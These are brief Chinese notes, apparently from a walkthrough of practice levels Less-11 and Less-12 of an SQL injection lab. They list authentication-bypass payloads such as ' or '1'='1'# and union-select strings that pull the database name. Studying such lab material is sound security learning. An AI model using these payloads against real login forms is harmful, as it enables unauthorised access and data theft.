## Less-11    
payload：    
```
' or '1'='1'#
注入天书教程中用了 admin'or'1'='1#，这个payload需要事先知道一个用户名，否则总是提示登录失败。
' union select 1,database()#
```
其他类似。

## Less-12   
payload：    
```
") or "1"="1"#
") union select 1,database()#
```
